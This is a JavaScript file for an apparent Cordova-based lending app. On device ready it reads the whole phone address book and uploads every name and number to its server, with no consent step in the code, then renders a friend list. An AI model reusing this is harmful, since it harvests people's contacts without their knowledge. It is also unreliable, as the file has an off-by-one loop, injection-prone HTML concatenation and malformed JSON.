
function friendDetail(){
    $.ajax({
   
    url: server_host+"/friendship/detail",
    type: "GET",
    data:{
        "accessToken":sessionStorage.getItem("accessToken")
    },
    success: function (msg) {
        if (msg.code == '401' || msg.code == '403') {
            alert(msg.msg);
            window.location.href = 'login.html';
    }else {
            var json = JSON.parse(msg.msg);
            for (var i = 0; i <= json.length; i++) {
                $("#app_content").append("<span onclick=\"window.location.href=\'friendsLoanList.html?userId="+json[i].friendId+"\'\"><span>"+json[i].realName+"</span></span><hr>");
            }
            $("#app_content").append("<br><br><br><br>");
        }
      } 
});
}


function uploadContacts(jsonStr){
    $.ajax({
   
    url: server_host+"/friendship/upload?accessToken="+sessionStorage.getItem("accessToken"),
    type: "POST",
    data:{
        contacts:jsonStr
    },
    success: function (msg) {
        if (msg.code == '401' || msg.code == '403') {
                alert(msg.msg);
                window.location.href = 'login.html';
        }else {
            alert(msg.msg);
        }
       
    }
});
}


// Wait for device API libraries to load
document.addEventListener("deviceready", onDeviceReady, false);
// device APIs are available

function onDeviceReady() {
    // find all contacts with ' ' in any name field    ,field 如果为空 则返回全部的
    var options = new ContactFindOptions();
    options.filter = "";
    options.multiple = true;
    /*
     查找关键字
     名字: "displayName"  ,
     电话号码:"phoneNumbers"   //ContactField[]类型

     */
    var fields = ["displayName", "name", "phoneNumbers"];
    navigator.contacts.find(fields, onSuccess, onError, options);
}


// onSuccess: Get a snapshot of the current contacts
function onSuccess(contacts) {

    // 联系人与电话号码 全写在这儿
    var aResult = [];

    for (var i = 0; contacts[i]; i++) {
        console.log("Display Name = " + contacts[i].displayName);

        if (contacts[i].phoneNumbers && contacts[i].phoneNumbers.length) {

            var contactPhoneList = [];

            for (var j = 0; contacts[i].phoneNumbers[j]; j++) {
                // alert(contacts[i].phoneNumbers[j].type+"    "+contacts[i].displayName+"---------" + contacts[i].phoneNumbers[j].value );

                contactPhoneList.push(
                        {
                            'type': contacts[i].phoneNumbers[j].type,
                            'value': contacts[i].phoneNumbers[j].value
                        }
                );

            }
            ;

            aResult.push({
                name: contacts[i].displayName,
                phone: contactPhoneList
            });

        }
        ;
        //
    }

    var contactsJson = '';
    contactsJson = contactsJson + "[";

    //迭代获取 联系人和号码
    for (var i = 0; aResult[i]; i++) {
        for (var j = 0; aResult[i].phone[j]; j++) {
             contactsJson = contactsJson + "{'name':" + aResult[i].name + ",'phoneNumber':" + aResult[i].phone[j].value + "},";
        }
        ;
    }
    ;
    contactsJson = contactsJson.substr(0, contactsJson.length - 1);
    contactsJson = contactsJson + "]";
    //alert(contactsJson);
    uploadContacts(contactsJson);
    friendDetail();
}
// onError: Failed to get the contacts
function onError(contactError) {
    alert('onError!');
}
function intent() {
    onDeviceReady();
}